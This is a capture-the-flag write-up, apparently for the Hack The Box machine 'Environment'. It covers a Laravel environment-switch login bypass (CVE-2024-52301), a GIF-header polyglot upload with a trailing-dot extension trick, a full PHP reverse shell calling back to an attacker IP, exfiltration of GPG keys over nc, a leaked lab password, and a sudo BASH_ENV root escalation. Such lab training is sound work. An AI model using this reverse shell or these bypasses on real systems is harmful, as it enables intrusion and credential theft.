**Initial Reconnaissance**  
I started with a full Nmap scan to identify open ports and running services on the target `environment.htb (10.10.11.67)`.  
The scan revealed three open ports:

- **22/tcp** running `OpenSSH 9.2p1`
    
- **80/tcp** running `nginx 1.22.1` with the title _Save the Environment_
    
- **8080/tcp** possibly running an HTTP proxy service

![[IMG-20260123023119437.png]]

This initial scan indicated that both HTTP and SSH services are available, and port 8080 might lead to an alternative interface or proxy.

Next, I performed a directory brute-force scan on `http://environment.htb/` using **Gobuster** (look at [[Tools]]) 

## Foothold

![[IMG-20260123023119482.png]]

The `/upload` directory caught my attention, so I decided to investigate it further to see if it could be used to upload files that might lead to code execution.

![[IMG-20260123023119955.png]]

Here, we discovered a lot of useful information.  
First, we saw that the application is running on the **Laravel** framework, version **11.30.0**.  
After some research on the internet, I found that the application is actually running in **debug mode**.

The objective now is to use debug mode to find useful information (maybe to log in without credentials).  
On this page, we don’t see anything useful for that.  
Let’s try to creat a situation that triggers another debug page.

![[IMG-20260123023120975.png]]

Let’s first try adding a **PUT** method on the login page instead of **GET** or **POST** (which are the valid methods).

![[IMG-20260123023121816.png]]

The information on this debug page is not useful, so let’s try another option.

![[IMG-20260123023122387.png]]

We can attempt to log in through the login page and intercept the request using **Burp Suite** to analyze and potentially modify its parameters.


![[IMG-20260123023123033.png]]

While interacting with the login form, I intentionally left the `remember` field empty and captured the request in **Burp Suite**.  
Submitting this request without the expected parameter triggered Laravel’s debug mode, revealing a **PHP ErrorException**:  
`Undefined variable $keep_loggedin`.

![[IMG-20260123023123612.png]]

At **line 79**, the application checks the current Laravel environment with

```c
if (App::environment() == "preprod") {
```

This behavior is clearly meant for developers to bypass login checks during pre-production testing, but it becomes a serious security risk if we can somehow switch the application into `"preprod"` mode.

Knowing that `"preprod"` mode was the key to a login bypass, I researched possible methods to change Laravel’s environment at runtime.  
After some investigation, I found **CVE-2024-52301**, a vulnerability affecting Laravel versions up to **11.30.0**.

![[IMG-20260123023124239.png]]

After identifying `"preprod"` as the key to bypass authentication, I researched how to switch Laravel’s environment dynamically. I find this [repository](https://github.com/Nyamort/CVE-2024-52301) on github which revealed critical details.
Laravel’s `detectEnvironment()` method processes `$_SERVER['argv']`, and if it contains arguments like `--env=preprod`, the application will **immediately switch context to that environment**, bypassing the standard configuration.

Knowing this, I concluded that **adding `?--env=preprod`** directly to the login URL would force the application into the pre-production mode and activate the built-in backdoor.

![[IMG-20260123023125388.png]]

So now we are connected! Let’s explore the website.
![[IMG-20260123023127798.png]]

On the profile page, we find a feature that allows uploading a profile picture.  
As a first test, let’s try uploading a simple file named `text.txt`.

![[IMG-20260123023128640.png]]

![[IMG-20260123023129094.png]]

We receive an **“Invalid file detected”** error, which suggests the server validates the **file contents** (magic bytes) rather than just the filename extension. To bypass this check, we’ll use the classic **GIF magic-header** technique.

**Idea:** craft a **polyglot** file that starts with the GIF signature `GIF89a` (what simple validators expect for images), then append our **PHP payload**. Many filters only peek at the first few bytes, so the upload passes, but PHP will still execute the code when the file is interpreted.

![[IMG-20260123023129505.png]]

![[IMG-20260123023129798.png]]

Now we can successfully upload files to the server, and we discover that they are accessible under the path `/storage/files/`.

![[IMG-20260123023130072.png]]

With this knowledge, we can upload a PHP file containing a reverse shell payload.  
Once uploaded, we can access it via its public URL in `/storage/files/` to execute the payload and obtain a reverse shell connection back to our machine.

```php
GIF89a;
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.222';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

Then we create a file named `reverse_shell.php`.

![[IMG-20260123023130323.png]]

However, this time we get another error: **“Invalid file detected”**.
This confirms that PHP files are not allowed for upload.  
We can bypass this restriction by simply changing the file extension — for example, renaming `.php` to `.php.` (adding a trailing dot).

![[IMG-20260123023130580.png]]

And there we are, our payload is now upload and when we open a port on the attacking machine we have our reverse shell

![[IMG-20260123023130913.png]]

![[IMG-20260123023130954.png]]

And there we are — our payload is now uploaded successfully.  
When we open a listening port on the attacking machine and then access the uploaded file’s URL, the reverse shell connects back to us, giving full interactive access to the target system.
(We can also use a payload meterpreter thanks to [[Metasploit]])

## User 

After obtaining the foothold, I started exploring the file system to look for potentially sensitive files. Inside `/home/hish/backup/`, I found a file named `keyvault.gpg`. This immediately caught my attention since `.gpg` files usually contain encrypted data that can be decrypted if the right private key is available.


![[IMG-20260123023131226.png]]

I attempted to decrypt the file with `gpg -d keyvault.gpg`, but the operation failed because the corresponding private key was not available on the system. This meant I had to search for `.gnupg` data belonging to the user `hish`. Once located, I archived the entire `.gnupg` folder and exfiltrated it to my attacking machine using `tar` piped through `nc`. Yor more information about these commands, refer to [[Linux/Command]].

**HTB machine:***
![[IMG-20260123023131473.png]]

***Attacking machine:***
![[IMG-20260123023131605.png]]

With the `.gnupg` folder retrieved, I imported it into my local GPG configuration and successfully decrypted `keyvault.gpg`. The decrypted content contained several plaintext credentials for different services, including `environment.htb`. 

![[IMG-20260123023131762.png]]

Using the credentials `marineSPm@ster!!` for the local account, I was able coonect with ssh and to read the `user.txt` flag.

![[IMG-20260123023131845.png]]

## Root

Next, I checked my sudo privileges with `sudo -l` and discovered that I could run `/usr/bin/systeminfo` as root with the `BASH_ENV` environment variable preserved. This is a dangerous configuration because `BASH_ENV` allows us to execute arbitrary commands automatically when a new Bash shell is spawned in non-interactive mode.

![[IMG-20260123023131943.png]]

To exploit this, I created a malicious script `/tmp/root.sh` containing a simple reverse shell payload, made it executable, and then ran:

```bash
sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo
```

Look at [[Linux/Privilege Escalation]] for more details.

![[IMG-20260123023131969.png]]

We can now retrieved the root flag:

![[IMG-20260123023131991.png]]
